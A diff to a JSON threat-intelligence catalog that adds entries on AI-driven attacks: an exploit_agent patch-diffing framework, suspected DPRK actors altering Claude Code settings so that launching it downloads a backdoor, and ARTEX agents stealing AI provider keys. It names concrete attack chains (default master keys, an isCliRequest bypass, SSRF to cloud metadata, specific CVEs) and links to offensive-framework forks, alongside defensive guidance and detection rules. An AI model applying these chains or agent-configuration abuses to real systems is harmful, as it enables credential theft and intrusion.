@@ -1,7 +1,335 @@
 {
   "generated_at": "2026-11-19T00:00:00.000Z",
-  "count": 280,
+  "count": 283,
   "attacks": [
+    {
+      "id": "gtig-exploit-agent-staging-server-2026-11",
+      "name": "GTIG finds an exposed exploit_agent server that diffs patches and runs exploits",
+      "date_reported": "2026-11-16",
+      "researcher": "Aurora Blum, Kelli Vanderlee, Jess Xia, David Mainor",
+      "org": "Google Threat Intelligence Group",
+      "sources": [
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/",
+          "title": "GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold",
+          "publisher": "Google Threat Intelligence Group"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "attacker_uses_ai_as_operator",
+      "ai_role_secondary": "llm_generated_malware",
+      "ai_role_detail": "The exposed server hosted a multi-agent framework, exploit_agent, that uses frontier and local LLMs to diff patched web-application code, draft exploits, and run them without a human in the loop.",
+      "technique_summary": "Google Threat Intelligence Group and Mandiant (Aurora Blum, Kelli Vanderlee, Jess Xia, and David Mainor, 16 November 2026) say that in the past quarter GTIG identified threat actors using LLM frameworks to automate vulnerability discovery and exploitation without a human in the loop. One case was an exposed staging server hosting a multi-agent vulnerability research and weaponization framework named exploit_agent. It integrates with multiple frontier and local LLMs. The framework continuously diffs popular web-application software, comparing code before and after patch announcements, analyzes the diff for vulnerabilities, drafts exploits, and executes them without human intervention. On the server, with data exfiltrated from targeted victims, GTIG found scripts for internal reconnaissance, brute-forcing, installing webshells, and removing other attackers' webshells. Victim telemetry on the server indicated interest in French websites in media and entertainment, and in education. A published sample shows the framework inspecting access-control code in the Spectra (Ultimate Addons for Gutenberg) WordPress plugin, version 2.19.25. An environment-file comment, in Russian, labels LLM API keys for auto-exploitation and tells the operator to write the keys in that file rather than in chat. GTIG does not name the operator, a country, or a public repository for exploit_agent. The Russian comment is an artifact on the server, not a stated victim or actor country.",
+      "initial_access": "Exposed staging server. For the victim sites, the report says the framework drafts and runs exploits against web applications. It does not name the vulnerability used at each site.",
+      "ai_tooling_and_models": [
+        "exploit_agent multi-agent framework",
+        "Frontier and local LLMs, models not named"
+      ],
+      "other_tooling": [
+        "Scripts for reconnaissance, brute force, webshell install, and webshell removal"
+      ],
+      "victims_and_sectors": "French websites in media and entertainment, and in education. No organization is named.",
+      "regions": [
+        "France"
+      ],
+      "attribution_or_cluster": "Unnamed. GTIG and Mandiant identified the exposed server. No cluster name and no country are stated.",
+      "scale_and_metrics": "One exposed staging server. Victim telemetry indicated French media, entertainment, and education sites. No victim count was published.",
+      "prevention_angle": "Treat a short patch window on internet-facing web applications as the defensive problem this report describes. Review Spectra (Ultimate Addons for Gutenberg) 2.19.25 and later plugin updates, unexpected PHP writes under plugin directories, webshell install and removal, reconnaissance and brute-force scripts on web servers, and outbound use of newly captured data. No public exploit_agent repository was identified.",
+      "related_magicsword_projects": [],
+      "source_notes": "The server, the exploit_agent name, the no-human-in-the-loop diff-and-execute loop, the post-compromise scripts, the French sector targeting, the Spectra 2.19.25 sample, and the Russian environment-file comment are from the 16 November 2026 GTIG tracker. The Russian text is quoted there as an LLM API-key comment for the exploit_agent pilot. It is not used as a country. GTIG published no repository URL. Searches during this review did not find a public exploit_agent project to link. No IP addresses, domains, or file hashes were published for this server.",
+      "last_reviewed": "2026-11-16",
+      "region_notes": "France is the victim-website geography GTIG stated. The Russian-language environment comment is an artifact on the staging server, not a victim region and not an attributed actor country.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0016.001",
+          "rationale": "GTIG found a deployed multi-agent software framework, exploit_agent, built to research and weaponize web-application patches.",
+          "source_urls": [
+            "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "staging",
+            "title": "Exposed exploit_agent staging server",
+            "description": "GTIG found a staging server hosting the multi-agent framework and data taken from victims.",
+            "kind": "access",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "diff",
+            "title": "Agents diff patches and draft exploits",
+            "description": "The framework compares web-application code across patch releases, looks for vulnerabilities, and drafts exploits with frontier and local LLMs. A sample inspection target is Spectra 2.19.25.",
+            "kind": "ai",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "run",
+            "title": "Framework runs the exploits",
+            "description": "GTIG says the framework executes the drafted exploits without a human in the loop.",
+            "kind": "execution",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "post",
+            "title": "Webshell, recon, and brute-force scripts",
+            "description": "Scripts on the server install webshells, remove other attackers' webshells, perform internal reconnaissance, and brute-force.",
+            "kind": "execution",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "victims",
+            "title": "French media, entertainment, and education",
+            "description": "Victim telemetry on the server pointed at French websites in those sectors. No organization is named.",
+            "kind": "impact",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "staging",
+            "target": "diff"
+          },
+          {
+            "source": "diff",
+            "target": "run"
+          },
+          {
+            "source": "run",
+            "target": "post"
+          },
+          {
+            "source": "post",
+            "target": "victims"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed operator",
+        "country": null,
+        "motivation": "unknown",
+        "attributed_by": "Google Threat Intelligence Group and Mandiant",
+        "confidence": "medium"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "confidence": "high",
+      "detections": [
+        {
+          "name": "Web Server Potential Command Injection Request",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/persistence_web_server_potential_command_injection.toml",
+          "notes": "Matched webshell and web command execution with security-detections-mcp. HTTP requests whose URLs contain command-execution patterns. GTIG says exploit_agent drafts and runs exploits against web applications. The rule does not name exploit_agent or Spectra."
+        },
+        {
+          "name": "PHP File Creation in WordPress Plugin Directory",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_webserver_php_file_creation_in_wordpress_plugin_dir.toml",
+          "notes": "Matched WordPress with security-detections-mcp. A PHP file written under a WordPress plugin directory by a web server, PHP handler, shell, or download tool. The published sample is the framework reading Spectra 2.19.25, a WordPress plugin, and the server also held webshell-install scripts. GTIG did not say a PHP file was written into a plugin directory, and did not name the operating system. This is the closest WordPress rule in the index."
+        },
+        {
+          "name": "Linux Webshell Indicators",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml",
+          "notes": "Matched webshell with security-detections-mcp. A web-server process starting a shell or reconnaissance command. GTIG describes webshell install and removal plus reconnaissance scripts. The rule is Linux process creation. The report does not name Linux, Windows, or the commands."
+        },
+        {
+          "name": "No rule names exploit_agent or the brute-force scripts",
+          "format": "guidance",
+          "notes": "security-detections-mcp searches for exploit_agent, Spectra, and brute force did not return a rule for this framework or for an unnamed web login. Brute-force rules in the index were for Okta, NTLM, RDP, SSH, or AWS IAM. None of those is the web-application brute-force script GTIG describes. The Russian environment-file comment is an operator note about where to put LLM API keys, not a host event a public rule encodes."
+        }
+      ],
+      "timeline": {
+        "last_updated": "2026-11-16",
+        "updates": [
+          {
+            "date": "2026-11-16",
+            "source": "Google Threat Intelligence Group and Mandiant",
+            "summary": "GTIG publishes the exposed exploit_agent staging server, including unattended patch diffing and exploit execution, webshell and brute-force scripts, French media, entertainment, and education targeting, and the Spectra 2.19.25 sample. No country and no public repository are stated."
+          }
+        ]
+      }
+    },
+    {
+      "id": "gtig-midnight-neptune-claude-settings-2026-11",
+      "name": "Suspected MIDNIGHT NEPTUNE uses SynthID recruiter lures and Claude Code settings to deploy SOMBERMEME",
+      "date_reported": "2026-11-16",
+      "researcher": "Aurora Blum, Kelli Vanderlee, Jess Xia, David Mainor",
+      "org": "Google Threat Intelligence Group",
+      "sources": [
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/",
+          "title": "GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold",
+          "publisher": "Google Threat Intelligence Group"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "attacker_uses_ai_as_operator",
+      "ai_role_secondary": "ai_agent_or_mcp_as_target",
+      "ai_role_detail": "SynthID watermarks on fake recruiter photos and likely LLM-authored ClickFix scripts are adversary use of generative models. The same intrusions then change .claude/settings.json so the victim's Claude Code launch downloads SOMBERMEME.",
+      "technique_summary": "Google Threat Intelligence Group (Aurora Blum, Kelli Vanderlee, Jess Xia, and David Mainor, 16 November 2026) describes suspected MIDNIGHT NEPTUNE activity in the DPRK section of the quarterly tracker. In recent intrusions against cryptocurrency organizations in North America and Europe, the cluster used LLM-enabled social engineering and the victim organization's AI tools as an internal supply-chain vector. For access, the actor created fraudulent recruiter profiles on professional networking platforms. The profile images contained SynthID watermarks, which GTIG says confirms LLM-synthesized identities. The personas sent targets to fraudulent meeting platforms with ClickFix lures that asked them to run diagnostic fix scripts. GTIG calls those staging scripts likely LLM-authored. After the initial compromise, the actor changed .claude/settings.json in internal code repositories so that starting Claude Code downloaded the SOMBERMEME backdoor. The actor also created GitHub personal access tokens named after Microsoft Copilot. GTIG places this in a broader observation that DPRK operators use generative tools for scale and use native agent execution hooks for enterprise access. No IP addresses, hashes, domains, or public tool repository were published for this cluster.",
+      "initial_access": "Fraudulent recruiter profiles on professional networking platforms, then ClickFix lures on fraudulent meeting pages that ask the target to run a diagnostic fix script.",
+      "ai_tooling_and_models": [
+        "LLM image generation, evidenced by SynthID watermarks",
+        "Likely LLM-authored ClickFix staging scripts",
+        "Claude Code, via .claude/settings.json"
+      ],
+      "other_tooling": [
+        "SOMBERMEME backdoor",
+        "GitHub personal access tokens named after Microsoft Copilot"
+      ],
+      "victims_and_sectors": "Cryptocurrency organizations in North America and Europe. No organization is named.",
+      "regions": [
+        "North America",
+        "Europe"
+      ],
+      "attribution_or_cluster": "Suspected MIDNIGHT NEPTUNE. GTIG describes the activity under Democratic People's Republic of Korea threat actors. The cluster name and the country are both stated as suspected.",
+      "scale_and_metrics": "GTIG says multiple intrusions over the course of 2026 used this combination, and describes recent intrusions against cryptocurrency organizations in North America and Europe. No victim count was published.",
+      "prevention_angle": "Review professional-network recruiter approaches that lead to a meeting page and a pasted diagnostic script. Diff .claude/settings.json in internal repositories, and alert when a process rewrites a file under .claude/ before Claude Code starts a download. Review new GitHub personal access tokens, including tokens whose names refer to Microsoft Copilot. No SOMBERMEME hash or domain was published.",
+      "related_magicsword_projects": [],
+      "source_notes": "The cluster name, SynthID watermarks, ClickFix meeting pages, the likely LLM-authored scripts, the .claude/settings.json change, SOMBERMEME, the Copilot-named GitHub tokens, and the North America and Europe cryptocurrency targeting are from the 16 November 2026 GTIG tracker. Category is adversary-use-of-ai because the operator used generative models for the recruiter imagery and, GTIG says, likely for the staging scripts. The change to the victim's Claude Code settings is ai_role_secondary ai_agent_or_mcp_as_target. That split matches other entries that contain both an operator role and abuse of an AI tool, and the category order in scripts/import-notion.mjs. No frameworks value is set. GTIG did not name an offensive framework for this cluster, and did not publish a command line or a host platform for the ClickFix script.",
+      "last_reviewed": "2026-11-16",
+      "region_notes": "North America and Europe are the target regions GTIG named. North Korea is the suspected actor country, not a victim region.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "recruit",
+            "title": "SynthID recruiter profiles",
+            "description": "Fraudulent recruiter profiles on professional networking platforms use images that carry SynthID watermarks.",
+            "kind": "access",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "clickfix",
+            "title": "ClickFix on a fake meeting page",
+            "description": "The personas direct targets to fraudulent meeting platforms. ClickFix pages ask them to run diagnostic fix scripts that GTIG calls likely LLM-authored.",
+            "kind": "execution",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "settings",
+            "title": "Claude Code settings.json is changed",
+            "description": "In internal repositories, .claude/settings.json is modified so that launching Claude Code downloads SOMBERMEME.",
+            "kind": "ai",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "somber",
+            "title": "Claude Code downloads SOMBERMEME",
+            "description": "Starting Claude Code triggers the download of the SOMBERMEME backdoor.",
+            "kind": "impact",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          },
+          {
+            "id": "pats",
+            "title": "GitHub PATs named after Copilot",
+            "description": "The actor creates GitHub personal access tokens named after Microsoft Copilot.",
+            "kind": "execution",
+            "source_urls": [
+              "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "recruit",
+            "target": "clickfix"
+          },
+          {
+            "source": "clickfix",
+            "target": "settings"
+          },
+          {
+            "source": "settings",
+            "target": "somber"
+          },
+          {
+            "source": "somber",
+            "target": "pats"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Suspected MIDNIGHT NEPTUNE",
+        "country": "North Korea",
+        "motivation": "nation-state",
+        "attributed_by": "Google Threat Intelligence Group",
+        "confidence": "medium"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "confidence": "high",
+      "detections": [
+        {
+          "name": "Suspicious ClickFix/FileFix Execution Pattern",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_clickfix_filefix_execution.yml",
+          "notes": "Matched ClickFix with security-detections-mcp. Windows process creation under explorer.exe for the Run-dialog or File Explorer paste pattern, often mshta.exe or powershell.exe. GTIG named ClickFix and diagnostic fix scripts. It did not publish the command or the operating system, so this rule applies only where that Windows paste path was used."
+        },
+        {
+          "name": "Unusual Process Modifying GenAI Configuration File",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/defense_evasion_genai_config_modification.toml",
+          "notes": "Matched settings.json and .claude with security-detections-mcp. A file modification under .claude/, which includes .claude/settings.json, by an unusual process. GTIG describes that file being changed in internal repositories. The rule sees a host file write, not the git commit by itself."
+        },
+        {
+          "name": "New GitHub Personal Access Token (PAT) Added",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/github/persistence_new_pat_created.toml",
+          "notes": "Matched personal access token with security-detections-mcp. GitHub audit creation of a PAT. GTIG says the tokens were named after Microsoft Copilot. The rule does not match on that name."
+        },
+        {
+          "name": "No rule names SOMBERMEME or SynthID",
+          "format": "guidance",
+          "notes": "security-detections-mcp searches for SOMBERMEME, SynthID, and deepfake returned no Sigma, Splunk, or Elastic rule. SynthID is a watermark on the published profile images, not a host event. SOMBERMEME has no published hash or domain in this report to attach to a malware rule."
+        }
+      ],
+      "timeline": {
+        "last_updated": "2026-11-16",
+        "updates": [
+          {
+            "date": "2026-11-16",
+            "source": "Google Threat Intelligence Group",
+            "summary": "GTIG describes suspected MIDNIGHT NEPTUNE intrusions against cryptocurrency organizations in North America and Europe, using SynthID recruiter images, likely LLM-authored ClickFix scripts, a .claude/settings.json change that makes Claude Code download SOMBERMEME, and GitHub PATs named after Microsoft Copilot."
+          }
+        ]
+      }
+    },
     {
       "id": "symantec-ai-revived-retailer-intrusion-2026-11",
       "name": "Symantec - AI-assisted commands revived a stalled intrusion at a US retailer",
@@ -435,6 +763,236 @@
           }
         ]
       }
+    },
+    {
+      "id": "amazon-artex-madpot-campaigns-2026-11",
+      "name": "Amazon MadPot records ARTEX agents hunting AI provider keys and attempting exchange KYC deepfakes",
+      "date_reported": "2026-11-13",
+      "date_activity_start": "2026-10-03",
+      "date_activity_end": "2026-11-05",
+      "researcher": "CJ Moses",
+      "org": "Amazon Threat Intelligence",
+      "sources": [
+        {
+          "url": "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/",
+          "title": "Amazon Threat Intelligence observes threat actors running cybercrime campaigns with ARTEX AI agents",
+          "publisher": "Amazon"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/amazon-uncovers-ai-agent-campaign.html",
+          "title": "Amazon Uncovers AI Agent Campaign Targeting LiteLLM, Dify, and Other Apps for API Keys",
+          "publisher": "The Hacker News"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "attacker_uses_ai_as_operator",
+      "ai_role_secondary": "ai_credential_theft",
+      "ai_role_detail": "MadPot decoys that presented LLM chat-completion APIs received ARTEX agents' own campaign memory, including prompts, tool history, and the shared knowledge graph.",
+      "technique_summary": "Amazon Threat Intelligence (CJ Moses, AWS Security Blog, 13 November 2026) says that from 3 October to 5 November 2026, MadPot decoys configured as popular LLM chat-completion APIs received requests from AI agents. The requests carried persistent task context, system prompts, tool histories, knowledge-graph state, and reported findings. Amazon assesses with moderate confidence that the agents ran on ARTEX, from prompt references to ARTEX tooling and other ARTEX artifacts, and with moderate confidence that the operators were disparate Chinese-nexus groups, from simplified Chinese prompts, China time-zone settings, targeting consistent with Chinese interests, and tooling predominantly used by Chinese-nexus threats. Standing instructions set mission, targeting, and constraints, including a fixed country sequence, a preference for enterprise production sites over personal projects, a ban on mainland China targets and government domains, and a requirement that outbound traffic use proxies. Credentials exposed for more than 30 days were to be treated as low-value. Most activity split work across planner, worker, verification, and compression agents sharing a knowledge graph. Campaign 1, in the agents' records, hunted internet-exposed AI gateways and application builders, extracted upstream provider keys, validated them, and pooled them. Named targets were One API, New API, Veloera, Sub2API, LiteLLM, Dify, FastGPT, Langflow, RAGFlow, Open WebUI, LobeChat, and Ollama. The recorded playbook mapped each product to known chains, including uninitialized installs, anonymous management and provider-configuration endpoints, the LiteLLM default master key, CVE-2025-3248 (Langflow), CVE-2026-28797 (RAGFlow), an isCliRequest authentication bypass on One API family systems, SSRF through URL-fetch features to cloud metadata services, and secrets in client-side JavaScript, source maps, debug routes, and environment files. Discovery used internet scanning, certificate transparency, GitHub repositories and event archives, npm and PyPI tarballs, container layers, notebooks, model-hosting spaces, paste sites, and Telegram. Stolen keys were fed into the framework gateway so stolen inference funded more hunting. Cloud credentials were validated, storage was enumerated, and managed AI services, secrets stores, and application identities were prioritized over general cloud permissions. Leads were graded L1, L2 for a working API call, and L3 for quantified impact. Campaign 2, in concurrent sessions against two cryptocurrency exchanges, attempted real-time deepfake video for liveness checks and forged ID-document photos. The agents' records say the vendor's server-side verdict rejected the deepfake on every recorded attempt. Amazon did not say whether the forged document photos passed. At least four sessions ran at once, on cash-out, balances, the deepfake pipeline, and the verification bypass. Amazon did not observe the described activity on other organizations as it happened and cannot verify the outcomes the agents reported. It notified potentially affected AWS customers. Community forks that answered HTTP 200 on 16 November 2026 are https://github.com/RuoJi6/ARTEX and https://github.com/MoLeft/ARTEX. The original Autumn-27/ARTEX repository returned HTTP 404.",
+      "initial_access": "The agents' records describe exposed AI management interfaces, default credentials, known product flaws, and public artifact searches. Amazon did not observe those intrusions on customer or third-party systems.",
+      "ai_tooling_and_models": [
+        "ARTEX (https://github.com/RuoJi6/ARTEX)",
+        "ARTEX (https://github.com/MoLeft/ARTEX)",
+        "LLM chat-completion APIs, as presented by MadPot",
+        "One API",
+        "New API",
+        "Veloera",
+        "Sub2API",
+        "LiteLLM",
+        "Dify",
+        "FastGPT",
+        "Langflow",
+        "RAGFlow",
+        "Open WebUI",
+        "LobeChat",
+        "Ollama"
+      ],
+      "frameworks": [
+        "artex"
+      ],
+      "other_tooling": [],
+      "victims_and_sectors": "Agents' records describe hundreds of targets across AI application platforms and other workloads, plus two cryptocurrency exchanges. Amazon notified potentially affected AWS customers. No organization is named here.",
+      "regions": [
+        "unknown"
+      ],
+      "attribution_or_cluster": "Unnamed Chinese-nexus groups. Amazon Threat Intelligence, moderate confidence, from simplified Chinese prompts, China time zones, targeting, and tooling. Financially motivated. Not a single named cluster.",
+      "scale_and_metrics": "MadPot collection window 3 October through 5 November 2026. The records describe hundreds of targets. Campaign 2 names two cryptocurrency exchanges and at least four concurrent agent sessions. Every recorded liveness verdict rejected the deepfake. No confirmed victim count was published.",
+      "prevention_angle": "Put AI gateways, application builders, and inference endpoints under the same controls as other production systems. Change default credentials, including the LiteLLM default master key, and do not leave an install uninitialized. Remove unauthenticated management and provider-configuration endpoints. Review Langflow for CVE-2025-3248 and RAGFlow for CVE-2026-28797, and do not trust an isCliRequest header as authentication on One API family systems. Alert on URL-fetch features that can reach cloud metadata, and on secrets in client-side JavaScript, source maps, debug routes, and environment files. Watch provider spend. Treat the published IPs as MadPot observations of agent traffic in the stated windows, and corroborate them before blocking.",
+      "related_magicsword_projects": [],
+      "source_notes": "The campaigns, the moderate-confidence attribution, the product list, the CVEs, the isCliRequest bypass, the SSRF and secret locations, the knowledge-graph roles, the two exchanges, the rejected liveness checks, and the eleven IPs are from the Amazon blog. Amazon states that it did not watch the off-decoy activity and cannot verify agent-reported outcomes. The Hacker News article of 16 November 2026 restates that blog. It also discusses Cloudflare and other ARTEX reporting that is not part of this entry. The Hacker News flaw table says Langflow versions before 1.3.0 are affected by CVE-2025-3248; Amazon's blog names the CVE and does not give that version range. https://github.com/RuoJi6/ARTEX and https://github.com/MoLeft/ARTEX returned HTTP 200 on 16 November 2026. https://github.com/Autumn-27/ARTEX returned HTTP 404 and is not linked. Mainland China appears only as an operator exclusion, not as a victim region.",
+      "last_reviewed": "2026-11-16",
+      "region_notes": "Amazon describes a fixed country sequence and an instruction to exclude mainland China and government domains. It does not name the countries of the hundreds of targets or of the two exchanges. Those instructions are not recorded as victim regions.",
+      "iocs": {
+        "domains": [],
+        "ips": [
+          "104.28.225.223",
+          "31.22.91.156",
+          "150.136.38.110",
+          "128.242.115.131",
+          "216.176.239.231",
+          "212.107.28.51",
+          "103.142.140.158",
+          "104.28.251.98",
+          "104.28.251.99",
+          "104.28.219.97",
+          "125.103.213.41"
+        ],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0016.001",
+          "rationale": "Amazon assesses the captured agents were running the ARTEX offensive framework.",
+          "source_urls": [
+            "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+          ]
+        },
+        {
+          "id": "AML.T0055",
+          "rationale": "The recorded playbook steals provider keys from exposed gateways, default credentials, client-side JavaScript, source maps, debug routes, and environment files.",
+          "source_urls": [
+            "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+          ]
+        },
+        {
+          "id": "AML.T0012",
+          "rationale": "Stolen keys were validated with provider identity services and fed into the framework gateway as working credentials.",
+          "source_urls": [
+            "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+          ]
+        },
+        {
+          "id": "AML.T0088",
+          "rationale": "A second campaign recorded real-time deepfake video and forged ID photos aimed at cryptocurrency-exchange KYC checks. Recorded liveness verdicts rejected the deepfake.",
+          "source_urls": [
+            "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "instruct",
+            "title": "Standing instructions set the mission",
+            "description": "Operators gave ARTEX agents objectives, a country sequence, proxy rules, and grading for stolen credentials. The agents then worked inside those instructions.",
+            "kind": "access",
+            "source_urls": [
+              "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+            ]
+          },
+          {
+            "id": "gateways",
+            "title": "Agents hunt exposed AI gateways",
+            "description": "Planner, worker, verification, and compression agents share a knowledge graph and record searches for One API, New API, Veloera, Sub2API, LiteLLM, Dify, FastGPT, Langflow, RAGFlow, Open WebUI, LobeChat, and Ollama.",
+            "kind": "ai",
+            "source_urls": [
+              "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+            ]
+          },
+          {
+            "id": "keys",
+            "title": "Stolen keys fund more hunting",
+            "description": "The records describe keys being validated, graded, pooled, and supplied to the framework gateway. Amazon cannot verify those outcomes.",
+            "kind": "impact",
+            "source_urls": [
+              "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+            ]
+          },
+          {
+            "id": "kyc",
+            "title": "Deepfake KYC at two exchanges",
+            "description": "Separate concurrent sessions record real-time deepfake video and forged ID photos aimed at two cryptocurrency exchanges.",
+            "kind": "ai",
+            "source_urls": [
+              "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+            ]
+          },
+          {
+            "id": "rejected",
+            "title": "Liveness checks reject the deepfake",
+            "description": "The vendor's server-side verdict rejected the deepfake on every attempt the agents recorded. The document-photo result was not stated.",
+            "kind": "impact",
+            "source_urls": [
+              "https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "instruct",
+            "target": "gateways"
+          },
+          {
+            "source": "gateways",
+            "target": "keys"
+          },
+          {
+            "source": "instruct",
+            "target": "kyc"
+          },
+          {
+            "source": "kyc",
+            "target": "rejected"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed Chinese-nexus groups",
+        "country": "China",
+        "motivation": "financially-motivated",
+        "attributed_by": "Amazon Threat Intelligence",
+        "confidence": "medium"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "confidence": "high",
+      "detections": [
+        {
+          "name": "Web Server Cloud Metadata SSRF Request",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/credential_access_web_server_cloud_imds_ssrf_request.toml",
+          "notes": "Matched SSRF and 169.254.169.254 with security-detections-mcp. Web-server URL or query hitting a cloud metadata endpoint. Amazon's captured playbook includes SSRF through URL-fetch features to cloud metadata. Amazon did not confirm each attempt succeeded."
+        },
+        {
+          "name": "Cloud Instance Metadata Credential Path HTTP Request",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/network/credential_access_cloud_imds_credential_http_request.toml",
+          "notes": "Matched 169.254.169.254 with security-detections-mcp. HTTP GET to a metadata credential path. Same playbook item, seen on packet capture rather than the web-server log."
+        },
+        {
+          "name": "Ollama API Accessed from External Network",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/initial_access_ollama_api_external_access.toml",
+          "notes": "Matched Ollama with security-detections-mcp. Ollama is one of the exposed AI applications the agents' records say they hunted. The rule flags an unauthenticated Ollama API accepting an external connection. It does not identify ARTEX."
+        },
+        {
+          "name": "No rule for the KYC deepfake or the named gateway flaws",
+          "format": "guidance",
+          "notes": "security-detections-mcp searches for deepfake, KYC, liveness, Langflow, RAGFlow, default credential, master key, and source map returned no Sigma, Splunk, or Elastic rule for this activity. A master-key hit was Windows DPAPI, which is a different control. Hunt the LiteLLM default master key, CVE-2025-3248, CVE-2026-28797, the One API family isCliRequest authentication bypass, and secrets in JavaScript bundles, source maps, debug routes, and environment files. There is no detection rule in the index for a rejected liveness deepfake."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-10-03",
+        "last_updated": "2026-11-16",
+        "updates": [
+          {
+            "date": "2026-11-13",
+            "source": "Amazon Threat Intelligence",
+            "summary": "CJ Moses publishes the MadPot capture of ARTEX agent memory for 3 October through 5 November 2026, including the credential-hunting playbook, the rejected KYC deepfakes, and eleven IP addresses."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "OpenAttacks",
+            "summary": "Entry added from the Amazon blog and The Hacker News restatement. Community fork URLs were checked, and the detection rules above were taken from security-detections-mcp matches whose pages returned HTTP 200."
+          }
+        ]
+      },
+      "linked_tools": [
+        "artex"
+      ]
     },
     {
       "id": "elastic-cyberstrikeai-aws-cloudtrail-2026-11",
@@ -1914,6 +2472,11 @@
           "url": "https://github.com/oritera/Cairn",
           "title": "Cairn",
           "publisher": "oritera"
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/",
+          "title": "GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold",
+          "publisher": "Google Threat Intelligence Group"
         }
       ],
       "magicsword_coverage": [],
@@ -1945,8 +2508,8 @@
